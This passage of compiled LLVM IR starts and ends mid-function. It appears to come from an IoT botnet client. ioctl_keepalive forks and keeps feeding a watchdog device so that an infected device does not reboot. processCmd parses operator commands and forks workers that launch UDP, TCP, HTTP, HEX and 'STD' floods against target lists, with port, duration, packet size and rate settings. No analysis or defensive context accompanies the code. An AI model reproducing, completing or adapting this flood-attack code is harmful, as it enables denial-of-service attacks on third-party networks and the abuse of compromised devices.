  %354 = load i32, i32* %34, align 4
  %355 = sub i32 0, 1
  %356 = sub i32 %354, %355
  %357 = add i32 %354, 1
  store i32 %356, i32* %34, align 4
  %358 = load i32, i32* %35, align 4
  %359 = load i32, i32* %15, align 4
  %360 = icmp eq i32 %358, %359
  br i1 %360, label %361, label %365

; <label>:361:                                    ; preds = %353
  %362 = load i32, i32* %16, align 4
  %363 = mul nsw i32 %362, 1000
  %364 = call i32 @usleep(i32 %363)
  store i32 0, i32* %35, align 4
  br label %293

; <label>:365:                                    ; preds = %353
  %366 = load i32, i32* %35, align 4
  %367 = add i32 %366, 1447662535
  %368 = add i32 %367, 1
  %369 = sub i32 %368, 1447662535
  %370 = add i32 %366, 1
  store i32 %369, i32* %35, align 4
  br label %293

; <label>:371:                                    ; preds = %351
  %372 = load i8*, i8** %30, align 8
  call void @llvm.stackrestore(i8* %372)
  br label %373

; <label>:373:                                    ; preds = %371, %143, %137, %132, %74, %64, %53
  ret void
}

; Function Attrs: noinline nounwind uwtable
define void @ioctl_keepalive() #0 {
  %1 = alloca i32, align 4
  %2 = alloca i32, align 4
  %3 = alloca i32, align 4
  %4 = call i32 @fork() #2
  store i32 %4, i32* @ioctl_pid, align 4
  %5 = load i32, i32* @ioctl_pid, align 4
  %6 = icmp sgt i32 %5, 0
  br i1 %6, label %10, label %7

; <label>:7:                                      ; preds = %0
  %8 = load i32, i32* @ioctl_pid, align 4
  %9 = icmp eq i32 %8, -1
  br i1 %9, label %10, label %11

; <label>:10:                                     ; preds = %7, %0
  ret void

; <label>:11:                                     ; preds = %7
  store i32 1, i32* %1, align 4
  store i32 0, i32* %2, align 4
  store i32 0, i32* %3, align 4
  %12 = call i32 (i8*, i32, ...) @open(i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.98, i32 0, i32 0), i32 2)
  store i32 %12, i32* %2, align 4
  %13 = icmp ne i32 %12, -1
  br i1 %13, label %20, label %14

; <label>:14:                                     ; preds = %11
  %15 = call i32 (i8*, i32, ...) @open(i8* getelementptr inbounds ([19 x i8], [19 x i8]* @.str.99, i32 0, i32 0), i32 2)
  store i32 %15, i32* %2, align 4
  %16 = icmp ne i32 %15, -1
  br i1 %16, label %20, label %17

; <label>:17:                                     ; preds = %14
  %18 = call i32 (i8*, i32, ...) @open(i8* getelementptr inbounds ([23 x i8], [23 x i8]* @.str.100, i32 0, i32 0), i32 2)
  store i32 %18, i32* %2, align 4
  %19 = icmp ne i32 %18, -1
  br i1 %19, label %20, label %23

; <label>:20:                                     ; preds = %17, %14, %11
  store i32 0, i32* %3, align 4
  %21 = load i32, i32* %2, align 4
  %22 = call i32 (i32, i64, ...) @ioctl(i32 %21, i64 2147768068, i32* %1) #2
  br label %23

; <label>:23:                                     ; preds = %20, %17
  %24 = load i32, i32* %3, align 4
  %25 = icmp ne i32 %24, 0
  br i1 %25, label %26, label %31

; <label>:26:                                     ; preds = %23
  br label %27

; <label>:27:                                     ; preds = %27, %26
  %28 = load i32, i32* %2, align 4
  %29 = call i32 (i32, i64, ...) @ioctl(i32 %28, i64 2147768069, i32 0) #2
  %30 = call i32 @sleep(i32 10)
  br label %27

; <label>:31:                                     ; preds = %23
  call void @exit(i32 0) #14
  unreachable
}

declare i32 @open(i8*, i32, ...) #3

; Function Attrs: nounwind
declare i32 @ioctl(i32, i64, ...) #4

declare i32 @sleep(i32) #3

; Function Attrs: noinline nounwind uwtable
define void @processCmd(i32, i8**) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i8**, align 8
  %5 = alloca i8*, align 8
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  %11 = alloca i32, align 4
  %12 = alloca i32, align 4
  %13 = alloca i8*, align 8
  %14 = alloca i8*, align 8
  %15 = alloca i32, align 4
  %16 = alloca i32, align 4
  %17 = alloca i32, align 4
  %18 = alloca i8*, align 8
  %19 = alloca i32, align 4
  %20 = alloca i32, align 4
  %21 = alloca i8*, align 8
  %22 = alloca i8*, align 8
  %23 = alloca i32, align 4
  %24 = alloca i32, align 4
  %25 = alloca i8*, align 8
  %26 = alloca i8*, align 8
  %27 = alloca i32, align 4
  %28 = alloca i32, align 4
  %29 = alloca i8*, align 8
  %30 = alloca i8*, align 8
  %31 = alloca i32, align 4
  %32 = alloca i32, align 4
  %33 = alloca i32, align 4
  %34 = alloca i32, align 4
  %35 = alloca i32, align 4
  %36 = alloca i8*, align 8
  %37 = alloca i8*, align 8
  %38 = alloca i32, align 4
  %39 = alloca i32, align 4
  %40 = alloca i32, align 4
  %41 = alloca i32, align 4
  %42 = alloca i32, align 4
  %43 = alloca i32, align 4
  %44 = alloca i32, align 4
  %45 = alloca i8*, align 8
  %46 = alloca i32, align 4
  %47 = alloca i64, align 8
  store i32 %0, i32* %3, align 4
  store i8** %1, i8*** %4, align 8
  %48 = load i8**, i8*** %4, align 8
  %49 = getelementptr inbounds i8*, i8** %48, i64 0
  %50 = load i8*, i8** %49, align 8
  %51 = call i32 @strcmp(i8* %50, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.101, i32 0, i32 0)) #10
  %52 = icmp ne i32 %51, 0
  br i1 %52, label %196, label %53

; <label>:53:                                     ; preds = %2
  %54 = load i32, i32* %3, align 4
  %55 = icmp slt i32 %54, 6
  br i1 %55, label %107, label %56

; <label>:56:                                     ; preds = %53
  %57 = load i8**, i8*** %4, align 8
  %58 = getelementptr inbounds i8*, i8** %57, i64 3
  %59 = load i8*, i8** %58, align 8
  %60 = call i32 @atoi(i8* %59) #10
  %61 = icmp eq i32 %60, -1
  br i1 %61, label %107, label %62

; <label>:62:                                     ; preds = %56
  %63 = load i8**, i8*** %4, align 8
  %64 = getelementptr inbounds i8*, i8** %63, i64 2
  %65 = load i8*, i8** %64, align 8
  %66 = call i32 @atoi(i8* %65) #10
  %67 = icmp eq i32 %66, -1
  br i1 %67, label %107, label %68

; <label>:68:                                     ; preds = %62
  %69 = load i8**, i8*** %4, align 8
  %70 = getelementptr inbounds i8*, i8** %69, i64 4
  %71 = load i8*, i8** %70, align 8
  %72 = call i32 @atoi(i8* %71) #10
  %73 = icmp eq i32 %72, -1
  br i1 %73, label %107, label %74

; <label>:74:                                     ; preds = %68
  %75 = load i8**, i8*** %4, align 8
  %76 = getelementptr inbounds i8*, i8** %75, i64 5
  %77 = load i8*, i8** %76, align 8
  %78 = call i32 @atoi(i8* %77) #10
  %79 = icmp eq i32 %78, -1
  br i1 %79, label %107, label %80

; <label>:80:                                     ; preds = %74
  %81 = load i8**, i8*** %4, align 8
  %82 = getelementptr inbounds i8*, i8** %81, i64 5
  %83 = load i8*, i8** %82, align 8
  %84 = call i32 @atoi(i8* %83) #10
  %85 = icmp sgt i32 %84, 65536
  br i1 %85, label %107, label %86

; <label>:86:                                     ; preds = %80
  %87 = load i8**, i8*** %4, align 8
  %88 = getelementptr inbounds i8*, i8** %87, i64 5
  %89 = load i8*, i8** %88, align 8
  %90 = call i32 @atoi(i8* %89) #10
  %91 = icmp sgt i32 %90, 65500
  br i1 %91, label %107, label %92

; <label>:92:                                     ; preds = %86
  %93 = load i8**, i8*** %4, align 8
  %94 = getelementptr inbounds i8*, i8** %93, i64 4
  %95 = load i8*, i8** %94, align 8
  %96 = call i32 @atoi(i8* %95) #10
  %97 = icmp sgt i32 %96, 32
  br i1 %97, label %107, label %98

; <label>:98:                                     ; preds = %92
  %99 = load i32, i32* %3, align 4
  %100 = icmp eq i32 %99, 7
  br i1 %100, label %101, label %108

; <label>:101:                                    ; preds = %98
  %102 = load i8**, i8*** %4, align 8
  %103 = getelementptr inbounds i8*, i8** %102, i64 6
  %104 = load i8*, i8** %103, align 8
  %105 = call i32 @atoi(i8* %104) #10
  %106 = icmp slt i32 %105, 1
  br i1 %106, label %107, label %108

; <label>:107:                                    ; preds = %101, %92, %86, %80, %74, %68, %62, %56, %53
  br label %757

; <label>:108:                                    ; preds = %101, %98
  %109 = load i8**, i8*** %4, align 8
  %110 = getelementptr inbounds i8*, i8** %109, i64 1
  %111 = load i8*, i8** %110, align 8
  store i8* %111, i8** %5, align 8
  %112 = load i8**, i8*** %4, align 8
  %113 = getelementptr inbounds i8*, i8** %112, i64 2
  %114 = load i8*, i8** %113, align 8
  %115 = call i32 @atoi(i8* %114) #10
  store i32 %115, i32* %6, align 4
  %116 = load i8**, i8*** %4, align 8
  %117 = getelementptr inbounds i8*, i8** %116, i64 3
  %118 = load i8*, i8** %117, align 8
  %119 = call i32 @atoi(i8* %118) #10
  store i32 %119, i32* %7, align 4
  %120 = load i8**, i8*** %4, align 8
  %121 = getelementptr inbounds i8*, i8** %120, i64 4
  %122 = load i8*, i8** %121, align 8
  %123 = call i32 @atoi(i8* %122) #10
  store i32 %123, i32* %8, align 4
  %124 = load i8**, i8*** %4, align 8
  %125 = getelementptr inbounds i8*, i8** %124, i64 5
  %126 = load i8*, i8** %125, align 8
  %127 = call i32 @atoi(i8* %126) #10
  store i32 %127, i32* %9, align 4
  %128 = load i32, i32* %3, align 4
  %129 = icmp sgt i32 %128, 6
  br i1 %129, label %130, label %135

; <label>:130:                                    ; preds = %108
  %131 = load i8**, i8*** %4, align 8
  %132 = getelementptr inbounds i8*, i8** %131, i64 6
  %133 = load i8*, i8** %132, align 8
  %134 = call i32 @atoi(i8* %133) #10
  br label %136

; <label>:135:                                    ; preds = %108
  br label %136

; <label>:136:                                    ; preds = %135, %130
  %137 = phi i32 [ %134, %130 ], [ 1000, %135 ]
  store i32 %137, i32* %10, align 4
  %138 = load i32, i32* %3, align 4
  %139 = icmp sgt i32 %138, 7
  br i1 %139, label %140, label %145

; <label>:140:                                    ; preds = %136
  %141 = load i8**, i8*** %4, align 8
  %142 = getelementptr inbounds i8*, i8** %141, i64 7
  %143 = load i8*, i8** %142, align 8
  %144 = call i32 @atoi(i8* %143) #10
  br label %146

; <label>:145:                                    ; preds = %136
  br label %146

; <label>:146:                                    ; preds = %145, %140
  %147 = phi i32 [ %144, %140 ], [ 1000000, %145 ]
  store i32 %147, i32* %11, align 4
  %148 = load i32, i32* %3, align 4
  %149 = icmp sgt i32 %148, 8
  br i1 %149, label %150, label %155

; <label>:150:                                    ; preds = %146
  %151 = load i8**, i8*** %4, align 8
  %152 = getelementptr inbounds i8*, i8** %151, i64 8
  %153 = load i8*, i8** %152, align 8
  %154 = call i32 @atoi(i8* %153) #10
  br label %156

; <label>:155:                                    ; preds = %146
  br label %156

; <label>:156:                                    ; preds = %155, %150
  %157 = phi i32 [ %154, %150 ], [ 0, %155 ]
  store i32 %157, i32* %12, align 4
  %158 = load i8*, i8** %5, align 8
  %159 = call i8* @strstr(i8* %158, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.97, i32 0, i32 0)) #10
  %160 = icmp ne i8* %159, null
  br i1 %160, label %161, label %182

; <label>:161:                                    ; preds = %156
  %162 = load i8*, i8** %5, align 8
  %163 = call i8* @strtok(i8* %162, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.97, i32 0, i32 0)) #2
  store i8* %163, i8** %13, align 8
  br label %164

; <label>:164:                                    ; preds = %179, %161
  %165 = load i8*, i8** %13, align 8
  %166 = icmp ne i8* %165, null
  br i1 %166, label %167, label %181

; <label>:167:                                    ; preds = %164
  %168 = call i32 @listFork()
  %169 = icmp ne i32 %168, 0
  br i1 %169, label %179, label %170

; <label>:170:                                    ; preds = %167
  %171 = load i8*, i8** %13, align 8
  %172 = load i32, i32* %6, align 4
  %173 = load i32, i32* %7, align 4
  %174 = load i32, i32* %8, align 4
  %175 = load i32, i32* %9, align 4
  %176 = load i32, i32* %10, align 4
  %177 = load i32, i32* %11, align 4
  %178 = load i32, i32* %12, align 4
  call void @sendUDP(i8* %171, i32 %172, i32 %173, i32 %174, i32 %175, i32 %176, i32 %177, i32 %178)
  call void @_exit(i32 0) #12
  unreachable

; <label>:179:                                    ; preds = %167
  %180 = call i8* @strtok(i8* null, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.97, i32 0, i32 0)) #2
  store i8* %180, i8** %13, align 8
  br label %164

; <label>:181:                                    ; preds = %164
  br label %195

; <label>:182:                                    ; preds = %156
  %183 = call i32 @listFork()
  %184 = icmp ne i32 %183, 0
  br i1 %184, label %194, label %185

; <label>:185:                                    ; preds = %182
  %186 = load i8*, i8** %5, align 8
  %187 = load i32, i32* %6, align 4
  %188 = load i32, i32* %7, align 4
  %189 = load i32, i32* %8, align 4
  %190 = load i32, i32* %9, align 4
  %191 = load i32, i32* %10, align 4
  %192 = load i32, i32* %11, align 4
  %193 = load i32, i32* %12, align 4
  call void @sendUDP(i8* %186, i32 %187, i32 %188, i32 %189, i32 %190, i32 %191, i32 %192, i32 %193)
  call void @_exit(i32 0) #12
  unreachable

; <label>:194:                                    ; preds = %182
  br label %195

; <label>:195:                                    ; preds = %194, %181
  br label %757

; <label>:196:                                    ; preds = %2
  %197 = load i8**, i8*** %4, align 8
  %198 = getelementptr inbounds i8*, i8** %197, i64 0
  %199 = load i8*, i8** %198, align 8
  %200 = call i32 @strcmp(i8* %199, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.102, i32 0, i32 0)) #10
  %201 = icmp ne i32 %200, 0
  br i1 %201, label %323, label %202

; <label>:202:                                    ; preds = %196
  %203 = load i32, i32* %3, align 4
  %204 = icmp slt i32 %203, 6
  br i1 %204, label %247, label %205

; <label>:205:                                    ; preds = %202
  %206 = load i8**, i8*** %4, align 8
  %207 = getelementptr inbounds i8*, i8** %206, i64 3
  %208 = load i8*, i8** %207, align 8
  %209 = call i32 @atoi(i8* %208) #10
  %210 = icmp eq i32 %209, -1
  br i1 %210, label %247, label %211

; <label>:211:                                    ; preds = %205
  %212 = load i8**, i8*** %4, align 8
  %213 = getelementptr inbounds i8*, i8** %212, i64 2
  %214 = load i8*, i8** %213, align 8
  %215 = call i32 @atoi(i8* %214) #10
  %216 = icmp eq i32 %215, -1
  br i1 %216, label %247, label %217

; <label>:217:                                    ; preds = %211
  %218 = load i8**, i8*** %4, align 8
  %219 = getelementptr inbounds i8*, i8** %218, i64 4
  %220 = load i8*, i8** %219, align 8
  %221 = call i32 @atoi(i8* %220) #10
  %222 = icmp eq i32 %221, -1
  br i1 %222, label %247, label %223

; <label>:223:                                    ; preds = %217
  %224 = load i8**, i8*** %4, align 8
  %225 = getelementptr inbounds i8*, i8** %224, i64 4
  %226 = load i8*, i8** %225, align 8
  %227 = call i32 @atoi(i8* %226) #10
  %228 = icmp sgt i32 %227, 32
  br i1 %228, label %247, label %229

; <label>:229:                                    ; preds = %223
  %230 = load i32, i32* %3, align 4
  %231 = icmp sgt i32 %230, 6
  br i1 %231, label %232, label %238

; <label>:232:                                    ; preds = %229
  %233 = load i8**, i8*** %4, align 8
  %234 = getelementptr inbounds i8*, i8** %233, i64 6
  %235 = load i8*, i8** %234, align 8
  %236 = call i32 @atoi(i8* %235) #10
  %237 = icmp slt i32 %236, 0
  br i1 %237, label %247, label %238

; <label>:238:                                    ; preds = %232, %229
  %239 = load i32, i32* %3, align 4
  %240 = icmp eq i32 %239, 8
  br i1 %240, label %241, label %248

; <label>:241:                                    ; preds = %238
  %242 = load i8**, i8*** %4, align 8
  %243 = getelementptr inbounds i8*, i8** %242, i64 7
  %244 = load i8*, i8** %243, align 8
  %245 = call i32 @atoi(i8* %244) #10
  %246 = icmp slt i32 %245, 1
  br i1 %246, label %247, label %248

; <label>:247:                                    ; preds = %241, %232, %223, %217, %211, %205, %202
  br label %757

; <label>:248:                                    ; preds = %241, %238
  %249 = load i8**, i8*** %4, align 8
  %250 = getelementptr inbounds i8*, i8** %249, i64 1
  %251 = load i8*, i8** %250, align 8
  store i8* %251, i8** %14, align 8
  %252 = load i8**, i8*** %4, align 8
  %253 = getelementptr inbounds i8*, i8** %252, i64 2
  %254 = load i8*, i8** %253, align 8
  %255 = call i32 @atoi(i8* %254) #10
  store i32 %255, i32* %15, align 4
  %256 = load i8**, i8*** %4, align 8
  %257 = getelementptr inbounds i8*, i8** %256, i64 3
  %258 = load i8*, i8** %257, align 8
  %259 = call i32 @atoi(i8* %258) #10
  store i32 %259, i32* %16, align 4
  %260 = load i8**, i8*** %4, align 8
  %261 = getelementptr inbounds i8*, i8** %260, i64 4
  %262 = load i8*, i8** %261, align 8
  %263 = call i32 @atoi(i8* %262) #10
  store i32 %263, i32* %17, align 4
  %264 = load i8**, i8*** %4, align 8
  %265 = getelementptr inbounds i8*, i8** %264, i64 5
  %266 = load i8*, i8** %265, align 8
  store i8* %266, i8** %18, align 8
  %267 = load i32, i32* %3, align 4
  %268 = icmp eq i32 %267, 8
  br i1 %268, label %269, label %274

; <label>:269:                                    ; preds = %248
  %270 = load i8**, i8*** %4, align 8
  %271 = getelementptr inbounds i8*, i8** %270, i64 7
  %272 = load i8*, i8** %271, align 8
  %273 = call i32 @atoi(i8* %272) #10
  br label %275

; <label>:274:                                    ; preds = %248
  br label %275

; <label>:275:                                    ; preds = %274, %269
  %276 = phi i32 [ %273, %269 ], [ 10, %274 ]
  store i32 %276, i32* %19, align 4
  %277 = load i32, i32* %3, align 4
  %278 = icmp sgt i32 %277, 6
  br i1 %278, label %279, label %284

; <label>:279:                                    ; preds = %275
  %280 = load i8**, i8*** %4, align 8
  %281 = getelementptr inbounds i8*, i8** %280, i64 6
  %282 = load i8*, i8** %281, align 8
  %283 = call i32 @atoi(i8* %282) #10
  br label %285

; <label>:284:                                    ; preds = %275
  br label %285

; <label>:285:                                    ; preds = %284, %279
  %286 = phi i32 [ %283, %279 ], [ 0, %284 ]
  store i32 %286, i32* %20, align 4
  %287 = load i8*, i8** %14, align 8
  %288 = call i8* @strstr(i8* %287, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.97, i32 0, i32 0)) #10
  %289 = icmp ne i8* %288, null
  br i1 %289, label %290, label %310

; <label>:290:                                    ; preds = %285
  %291 = load i8*, i8** %14, align 8
  %292 = call i8* @strtok(i8* %291, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.97, i32 0, i32 0)) #2
  store i8* %292, i8** %21, align 8
  br label %293

; <label>:293:                                    ; preds = %307, %290
  %294 = load i8*, i8** %21, align 8
  %295 = icmp ne i8* %294, null
  br i1 %295, label %296, label %309

; <label>:296:                                    ; preds = %293
  %297 = call i32 @listFork()
  %298 = icmp ne i32 %297, 0
  br i1 %298, label %307, label %299

; <label>:299:                                    ; preds = %296
  %300 = load i8*, i8** %21, align 8
  %301 = load i32, i32* %15, align 4
  %302 = load i32, i32* %16, align 4
  %303 = load i32, i32* %17, align 4
  %304 = load i8*, i8** %18, align 8
  %305 = load i32, i32* %20, align 4
  %306 = load i32, i32* %19, align 4
  call void @sendTCP(i8* %300, i32 %301, i32 %302, i32 %303, i8* %304, i32 %305, i32 %306)
  call void @_exit(i32 0) #12
  unreachable

; <label>:307:                                    ; preds = %296
  %308 = call i8* @strtok(i8* null, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.97, i32 0, i32 0)) #2
  store i8* %308, i8** %21, align 8
  br label %293

; <label>:309:                                    ; preds = %293
  br label %322

; <label>:310:                                    ; preds = %285
  %311 = call i32 @listFork()
  %312 = icmp ne i32 %311, 0
  br i1 %312, label %321, label %313

; <label>:313:                                    ; preds = %310
  %314 = load i8*, i8** %14, align 8
  %315 = load i32, i32* %15, align 4
  %316 = load i32, i32* %16, align 4
  %317 = load i32, i32* %17, align 4
  %318 = load i8*, i8** %18, align 8
  %319 = load i32, i32* %20, align 4
  %320 = load i32, i32* %19, align 4
  call void @sendTCP(i8* %314, i32 %315, i32 %316, i32 %317, i8* %318, i32 %319, i32 %320)
  call void @_exit(i32 0) #12
  unreachable

; <label>:321:                                    ; preds = %310
  br label %322

; <label>:322:                                    ; preds = %321, %309
  br label %757

; <label>:323:                                    ; preds = %196
  %324 = load i8**, i8*** %4, align 8
  %325 = getelementptr inbounds i8*, i8** %324, i64 0
  %326 = load i8*, i8** %325, align 8
  %327 = call i32 @strcmp(i8* %326, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.103, i32 0, i32 0)) #10
  %328 = icmp ne i32 %327, 0
  br i1 %328, label %377, label %329

; <label>:329:                                    ; preds = %323
  %330 = load i32, i32* %3, align 4
  %331 = icmp slt i32 %330, 4
  br i1 %331, label %344, label %332

; <label>:332:                                    ; preds = %329
  %333 = load i8**, i8*** %4, align 8
  %334 = getelementptr inbounds i8*, i8** %333, i64 2
  %335 = load i8*, i8** %334, align 8
  %336 = call i32 @atoi(i8* %335) #10
  %337 = icmp slt i32 %336, 1
  br i1 %337, label %344, label %338

; <label>:338:                                    ; preds = %332
  %339 = load i8**, i8*** %4, align 8
  %340 = getelementptr inbounds i8*, i8** %339, i64 3
  %341 = load i8*, i8** %340, align 8
  %342 = call i32 @atoi(i8* %341) #10
  %343 = icmp slt i32 %342, 1
  br i1 %343, label %344, label %345

; <label>:344:                                    ; preds = %338, %332, %329
  br label %757

; <label>:345:                                    ; preds = %338
  %346 = load i8**, i8*** %4, align 8
  %347 = getelementptr inbounds i8*, i8** %346, i64 1
  %348 = load i8*, i8** %347, align 8
  store i8* %348, i8** %22, align 8
  %349 = load i8**, i8*** %4, align 8
  %350 = getelementptr inbounds i8*, i8** %349, i64 2
  %351 = load i8*, i8** %350, align 8
  %352 = call i32 @atoi(i8* %351) #10
  store i32 %352, i32* %23, align 4
  %353 = load i8**, i8*** %4, align 8
  %354 = getelementptr inbounds i8*, i8** %353, i64 3
  %355 = load i8*, i8** %354, align 8
  %356 = call i32 @atoi(i8* %355) #10
  store i32 %356, i32* %24, align 4
  %357 = load i8*, i8** %22, align 8
  %358 = call i8* @strstr(i8* %357, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.97, i32 0, i32 0)) #10
  %359 = icmp ne i8* %358, null
  br i1 %359, label %360, label %372

; <label>:360:                                    ; preds = %345
  %361 = load i8*, i8** %22, align 8
  %362 = call i8* @strtok(i8* %361, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.97, i32 0, i32 0)) #2
  store i8* %362, i8** %25, align 8
  br label %363

; <label>:363:                                    ; preds = %366, %360
  %364 = load i8*, i8** %25, align 8
  %365 = icmp ne i8* %364, null
  br i1 %365, label %366, label %371

; <label>:366:                                    ; preds = %363
  %367 = load i8*, i8** %25, align 8
  %368 = load i32, i32* %23, align 4
  %369 = load i32, i32* %24, align 4
  call void @sendHTTP(i8* %367, i32 %368, i32 %369)
  %370 = call i8* @strtok(i8* null, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.97, i32 0, i32 0)) #2
  store i8* %370, i8** %25, align 8
  br label %363

; <label>:371:                                    ; preds = %363
  br label %376

; <label>:372:                                    ; preds = %345
  %373 = load i8*, i8** %22, align 8
  %374 = load i32, i32* %23, align 4
  %375 = load i32, i32* %24, align 4
  call void @sendHTTP(i8* %373, i32 %374, i32 %375)
  br label %376

; <label>:376:                                    ; preds = %372, %371
  br label %757

; <label>:377:                                    ; preds = %323
  %378 = load i8**, i8*** %4, align 8
  %379 = getelementptr inbounds i8*, i8** %378, i64 0
  %380 = load i8*, i8** %379, align 8
  %381 = call i32 @strcmp(i8* %380, i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.104, i32 0, i32 0)) #10
  %382 = icmp ne i32 %381, 0
  br i1 %382, label %426, label %383

; <label>:383:                                    ; preds = %377
  %384 = load i32, i32* %3, align 4
  %385 = icmp slt i32 %384, 6
  br i1 %385, label %398, label %386

; <label>:386:                                    ; preds = %383
  %387 = load i8**, i8*** %4, align 8
  %388 = getelementptr inbounds i8*, i8** %387, i64 3
  %389 = load i8*, i8** %388, align 8
  %390 = call i32 @atoi(i8* %389) #10
  %391 = icmp slt i32 %390, 1
  br i1 %391, label %398, label %392

; <label>:392:                                    ; preds = %386
  %393 = load i8**, i8*** %4, align 8
  %394 = getelementptr inbounds i8*, i8** %393, i64 5
  %395 = load i8*, i8** %394, align 8
  %396 = call i32 @atoi(i8* %395) #10
  %397 = icmp slt i32 %396, 1
  br i1 %397, label %398, label %399

; <label>:398:                                    ; preds = %392, %386, %383
  br label %757

; <label>:399:                                    ; preds = %392
  %400 = call i32 @listFork()
  %401 = icmp ne i32 %400, 0
  br i1 %401, label %402, label %403

; <label>:402:                                    ; preds = %399
  br label %757

; <label>:403:                                    ; preds = %399
  %404 = load i8**, i8*** %4, align 8
  %405 = getelementptr inbounds i8*, i8** %404, i64 1
  %406 = load i8*, i8** %405, align 8
  %407 = load i8**, i8*** %4, align 8
  %408 = getelementptr inbounds i8*, i8** %407, i64 2
  %409 = load i8*, i8** %408, align 8
  %410 = load i8**, i8*** %4, align 8
  %411 = getelementptr inbounds i8*, i8** %410, i64 3
  %412 = load i8*, i8** %411, align 8
  %413 = call i32 @atoi(i8* %412) #10
  %414 = trunc i32 %413 to i16
  %415 = load i8**, i8*** %4, align 8
  %416 = getelementptr inbounds i8*, i8** %415, i64 4
  %417 = load i8*, i8** %416, align 8
  %418 = load i8**, i8*** %4, align 8
  %419 = getelementptr inbounds i8*, i8** %418, i64 5
  %420 = load i8*, i8** %419, align 8
  %421 = call i32 @atoi(i8* %420) #10
  %422 = load i8**, i8*** %4, align 8
  %423 = getelementptr inbounds i8*, i8** %422, i64 6
  %424 = load i8*, i8** %423, align 8
  %425 = call i32 @atoi(i8* %424) #10
  call void @sendHEX(i8* %406, i8* %409, i16 zeroext %414, i8* %417, i32 %421, i32 %425)
  call void @exit(i32 0) #14
  unreachable

; <label>:426:                                    ; preds = %377
  %427 = load i8**, i8*** %4, align 8
  %428 = getelementptr inbounds i8*, i8** %427, i64 0
  %429 = load i8*, i8** %428, align 8
  %430 = call i32 @strcmp(i8* %429, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.105, i32 0, i32 0)) #10
  %431 = icmp ne i32 %430, 0
  br i1 %431, label %480, label %432

; <label>:432:                                    ; preds = %426
  %433 = load i32, i32* %3, align 4
  %434 = icmp slt i32 %433, 4
  br i1 %434, label %447, label %435

; <label>:435:                                    ; preds = %432
  %436 = load i8**, i8*** %4, align 8
  %437 = getelementptr inbounds i8*, i8** %436, i64 2
  %438 = load i8*, i8** %437, align 8
  %439 = call i32 @atoi(i8* %438) #10
  %440 = icmp slt i32 %439, 1
  br i1 %440, label %447, label %441

; <label>:441:                                    ; preds = %435
  %442 = load i8**, i8*** %4, align 8
  %443 = getelementptr inbounds i8*, i8** %442, i64 3
  %444 = load i8*, i8** %443, align 8
  %445 = call i32 @atoi(i8* %444) #10
  %446 = icmp slt i32 %445, 1
  br i1 %446, label %447, label %448

; <label>:447:                                    ; preds = %441, %435, %432
  br label %757

; <label>:448:                                    ; preds = %441
  %449 = load i8**, i8*** %4, align 8
  %450 = getelementptr inbounds i8*, i8** %449, i64 1
  %451 = load i8*, i8** %450, align 8
  store i8* %451, i8** %26, align 8
  %452 = load i8**, i8*** %4, align 8
  %453 = getelementptr inbounds i8*, i8** %452, i64 2
  %454 = load i8*, i8** %453, align 8
  %455 = call i32 @atoi(i8* %454) #10
  store i32 %455, i32* %27, align 4
  %456 = load i8**, i8*** %4, align 8
  %457 = getelementptr inbounds i8*, i8** %456, i64 3
  %458 = load i8*, i8** %457, align 8
  %459 = call i32 @atoi(i8* %458) #10
  store i32 %459, i32* %28, align 4
  %460 = load i8*, i8** %26, align 8
  %461 = call i8* @strstr(i8* %460, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.97, i32 0, i32 0)) #10
  %462 = icmp ne i8* %461, null
  br i1 %462, label %463, label %475

; <label>:463:                                    ; preds = %448
  %464 = load i8*, i8** %26, align 8
  %465 = call i8* @strtok(i8* %464, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.97, i32 0, i32 0)) #2
  store i8* %465, i8** %29, align 8
  br label %466

; <label>:466:                                    ; preds = %469, %463
  %467 = load i8*, i8** %29, align 8
  %468 = icmp ne i8* %467, null
  br i1 %468, label %469, label %474

; <label>:469:                                    ; preds = %466
  %470 = load i8*, i8** %29, align 8
  %471 = load i32, i32* %27, align 4
  %472 = load i32, i32* %28, align 4
  call void @sendSTD(i8* %470, i32 %471, i32 %472)
  %473 = call i8* @strtok(i8* null, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.97, i32 0, i32 0)) #2
  store i8* %473, i8** %29, align 8
  br label %466

; <label>:474:                                    ; preds = %466
  br label %479

; <label>:475:                                    ; preds = %448
  %476 = load i8*, i8** %26, align 8
  %477 = load i32, i32* %27, align 4
  %478 = load i32, i32* %28, align 4
  call void @sendSTD(i8* %476, i32 %477, i32 %478)
  br label %479

; <label>:479:                                    ; preds = %475, %474
  br label %757

; <label>:480:                                    ; preds = %426
  %481 = load i8**, i8*** %4, align 8
  %482 = getelementptr inbounds i8*, i8** %481, i64 0
  %483 = load i8*, i8** %482, align 8
  %484 = call i32 @strcmp(i8* %483, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.106, i32 0, i32 0)) #10
  %485 = icmp ne i32 %484, 0
  br i1 %485, label %560, label %486

; <label>:486:                                    ; preds = %480
  %487 = load i32, i32* %3, align 4
  %488 = icmp slt i32 %487, 6
  br i1 %488, label %489, label %490

; <label>:489:                                    ; preds = %486
  br label %757

; <label>:490:                                    ; preds = %486
  %491 = load i8**, i8*** %4, align 8
  %492 = getelementptr inbounds i8*, i8** %491, i64 1
  %493 = load i8*, i8** %492, align 8
  store i8* %493, i8** %30, align 8
  %494 = load i8**, i8*** %4, align 8
  %495 = getelementptr inbounds i8*, i8** %494, i64 2
  %496 = load i8*, i8** %495, align 8
  %497 = call i32 @atoi(i8* %496) #10
  store i32 %497, i32* %31, align 4
